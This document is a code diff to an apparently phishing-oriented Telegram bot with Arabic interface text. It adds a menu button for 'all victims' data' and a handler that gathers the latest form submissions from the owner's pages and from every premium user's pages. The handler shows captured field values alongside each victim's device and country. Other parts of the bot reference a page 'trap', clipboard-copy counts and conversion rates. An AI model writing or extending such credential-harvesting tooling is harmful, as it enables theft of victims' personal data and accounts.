@@ -203,7 +203,7 @@ function sendPageMain(chatId, editMsgId) {
     [{text:"🔄 تجديد الرابط",callback_data:"pg_renew"},{text:`${wIcon} رسالة الترحيب`,callback_data:"pg_welcome"}],
     [{text:"👁️ معاينة",callback_data:"pg_preview"},{text:toggleLabel,callback_data:"pg_toggle"}],
     [{text:pageConfig.trapEnabled?"🪤✅ فخ الصفحة":"🪤 فخ الصفحة",callback_data:"pg_trap"},{text:`${passIcon} كلمة سر`,callback_data:"pg_setpass"}],
-    [{text:`${fwdIcon} إرسال البيانات للبريمو`,callback_data:"pg_fwdprem"}]
+    [{text:`${fwdIcon} إرسال البيانات للبريمو`,callback_data:"pg_fwdprem"},{text:"📊 كل بيانات الضحايا",callback_data:"pg_allsubs"}]
   ]});
   if (editMsgId) return bot.editMessageText(text,{chat_id:chatId,message_id:editMsgId,parse_mode:"Markdown",reply_markup:kb}).catch(()=>{});
   return bot.sendMessage(chatId, text, {parse_mode:"Markdown", reply_markup:kb});
@@ -1726,6 +1726,31 @@ bot.on('callback_query', async (q) => {
       `📊 *إحصائيات الصفحة*\n\n👁️ إجمالي المشاهدات: ${pageConfig.views||0}\n✅ إجمالي الإرسال: ${submissions.length}\n📅 إرسال اليوم: ${todaySubs}\n📈 نسبة التحويل: ${rate}%\n📋 نسخ من الحافظة: ${pageConfig.clipCount||0}\n\n🎨 القالب: ${TPL_THEMES[pageConfig.template]?.name||pageConfig.template}`,
       {parse_mode:"Markdown", reply_markup:JSON.stringify({inline_keyboard:[[{text:"🔙 رجوع",callback_data:"pg_main"}]]})}
     );
+  }
+
+  if (data === "pg_allsubs" && chatId === BOT_OWNER) {
+    // Combine owner's submissions + all premium users' submissions
+    const all = [];
+    for (const s of submissions) all.push({ ...s, src: "صفحتك" });
+    for (const [uid, subs] of Object.entries(userSubs)) {
+      const prof = profiles[uid] || {};
+      const name = prof.name || uid;
+      for (const s of (subs || [])) all.push({ ...s, src: name });
+    }
+    if (!all.length) return bot.sendMessage(chatId, "📋 لا توجد بيانات من أي صفحة بعد.", {reply_markup:JSON.stringify({inline_keyboard:[[{text:"🔙 رجوع",callback_data:"pg_main"}]]})});
+    // Sort by time descending, take last 10
+    all.sort((a,b) => (b.time||"").localeCompare(a.time||""));
+    const last10 = all.slice(0, 10);
+    let txt = `📊 *آخر ${last10.length} إدخال من كل الصفحات:*\n━━━━━━━━━━━━━━\n`;
+    for (const s of last10) {
+      txt += `📄 *${s.src}* — ${s.time||"?"}\n`;
+      for (const [k,v] of Object.entries(s.fields||{})) txt += `📝 ${k}: \`${v}\`\n`;
+      txt += `📱 ${s.device||"?"} | 🌍 ${s.country||"?"}\n━━━━━━━━━━━━━━\n`;
+    }
+    txt += `\n📦 الإجمالي: ${all.length} إدخال`;
+    return bot.sendMessage(chatId, txt, {parse_mode:"Markdown",
+      reply_markup:JSON.stringify({inline_keyboard:[[{text:"🔙 رجوع",callback_data:"pg_main"}]]})
+    });
   }
 
   if (data === "pg_log") {
